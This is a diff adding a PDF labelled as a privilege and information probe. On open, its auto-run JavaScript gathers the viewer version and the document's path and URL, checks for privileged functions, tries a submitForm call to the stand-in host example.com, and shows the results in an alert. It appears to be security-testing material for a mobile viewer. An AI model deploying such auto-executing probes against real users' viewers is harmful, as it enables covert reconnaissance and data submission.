@@ -1,0 +1,72 @@
+%PDF-1.7
+% Combined Probe PDF - Priv & Info Test - Jan 2026
+1 0 obj
+<< /Type /Catalog
+   /Pages 2 0 R
+   /OpenAction 3 0 R
+>>
+endobj
+2 0 obj
+<< /Type /Pages
+   /Kids [4 0 R]
+   /Count 1
+>>
+endobj
+3 0 obj
+<< /Type /Action
+   /S /JavaScript
+   /JS (
+      try {
+        var results = [];
+        results.push("ViewerType: " + (app.viewerType || "unknown"));
+        results.push("ViewerVersion: " + (app.viewerVersion || "?"));
+        results.push("Doc path: " + (this.path || "no path"));
+        results.push("Doc URL: " + (this.URL || "no URL"));
+        results.push("Dirty: " + this.dirty);
+        results.push("Has getField: " + (typeof this.getField === "function"));
+        
+        // Privileged attempts
+        try { 
+          var privTest = app.browseForFile ? "browseForFile exists" : "no browseForFile";
+          results.push(privTest);
+        } catch(e) { results.push("browseForFile err: " + e); }
+        
+        try { 
+          this.submitForm({cURL: "https://example.com"}); 
+          results.push("submitForm: executed?!"); 
+        } catch(e) { results.push("submitForm err: " + e); }
+        
+        app.alert("Probe results:\\n" + results.join("\\n"));
+      } catch (e) {
+        app.alert("Top error: " + e + "\\nStack: " + (e.stack || "no stack"));
+      }
+   )
+>>
+endobj
+4 0 obj
+<< /Type /Page
+   /Parent 2 0 R
+   /MediaBox [0 0 400 300]
+   /Contents 5 0 R
+>>
+endobj
+5 0 obj
+<< /Length 120 >>
+stream
+BT /F1 14 Tf 50 250 Td (Probe PDF - Check alerts) Tj ET
+BT /F1 12 Tf 50 220 Td (Open on mobile PowerApps) Tj ET
+endstream
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000015 00000 n 
+0000000075 00000 n 
+0000000140 00000 n 
+0000000320 00000 n 
+0000000480 00000 n 
+trailer
+<< /Size 6 /Root 1 0 R >>
+startxref
+580
+%%EOF
